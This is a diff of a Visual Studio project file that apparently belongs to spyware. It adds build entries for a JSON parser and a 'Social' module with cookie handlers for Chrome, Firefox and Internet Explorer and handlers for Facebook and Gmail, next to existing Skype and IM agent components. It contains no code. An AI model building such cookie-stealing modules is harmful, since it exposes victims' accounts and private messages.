@@ -84,7 +84,7 @@
       <Optimization>MaxSpeed</Optimization>
       <InlineFunctionExpansion>OnlyExplicitInline</InlineFunctionExpansion>
       <OmitFramePointers>true</OmitFramePointers>
-      <AdditionalIncludeDirectories>C:\Programmi\Microsoft Visual Studio 9.0\VC\include\dx;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <AdditionalIncludeDirectories>C:\Programmi\Microsoft Visual Studio 9.0\VC\include\dx;C:\Users\naga\Desktop\jbenet-bson-cpp-c3e78ea\src;C:\Users\naga\Desktop\boost_1_47_0;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
       <PreprocessorDefinitions>WIN32;NDEBUG;_WINDOWS;_USRDLL;H4DLL_EXPORTS;_WIN32_WINNT=_WIN32_WINNT_WINXP;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <StringPooling>true</StringPooling>
       <ExceptionHandling>Async</ExceptionHandling>
@@ -122,12 +122,22 @@
     <ClCompile Include="explore_directory.cpp" />
     <ClCompile Include="H4-DLL.cpp" />
     <ClCompile Include="HM_IMAgent\QMsnLive2011.cpp" />
+    <ClCompile Include="JSON\JSON.cpp" />
+    <ClCompile Include="JSON\JSONValue.cpp" />
     <ClCompile Include="LOG.cpp" />
     <ClCompile Include="SkypeACL\HashUtil.cpp" />
     <ClCompile Include="SkypeACL\KeyGen_SBOX.cpp" />
     <ClCompile Include="SkypeACL\sha256.cpp" />
     <ClCompile Include="SkypeACL\SkypeACL.cpp" />
     <ClCompile Include="SM_Core.cpp" />
+    <ClCompile Include="Social\CookieHandler.cpp" />
+    <ClCompile Include="Social\Cookie_Chrome.cpp" />
+    <ClCompile Include="Social\Cookie_FireFox.cpp" />
+    <ClCompile Include="Social\Cookie_IExplorer.cpp" />
+    <ClCompile Include="Social\Handler_Facebook.cpp" />
+    <ClCompile Include="Social\Handler_GMail.cpp" />
+    <ClCompile Include="Social\NetworkHandler.cpp" />
+    <ClCompile Include="Social\SocialMain.cpp" />
     <ClCompile Include="status_log.cpp" />
     <ClCompile Include="UnHookClass.cpp" />
     <ClCompile Include="x64.cpp" />
@@ -186,6 +196,9 @@
   <ItemGroup>
     <ClInclude Include="aes_alg.h" />
     <ClInclude Include="HM_IMAgent\QMsnLive2011.h" />
+    <ClInclude Include="HM_SocialAgent.h" />
+    <ClInclude Include="JSON\JSON.h" />
+    <ClInclude Include="JSON\JSONValue.h" />
     <ClInclude Include="md5.h" />
     <ClInclude Include="sha1.h" />
     <ClInclude Include="HM_IMAgent\QAgent.h" />
@@ -246,6 +259,9 @@
     <ClInclude Include="SM_ActionFunctions.h" />
     <ClInclude Include="SM_Core.h" />
     <ClInclude Include="SM_EventHandlers.h" />
+    <ClInclude Include="Social\CookieHandler.h" />
+    <ClInclude Include="Social\NetworkHandler.h" />
+    <ClInclude Include="Social\SocialMain.h" />
     <ClInclude Include="status_log.h" />
     <ClInclude Include="UnHookClass.h" />
     <ClInclude Include="x64.h" />
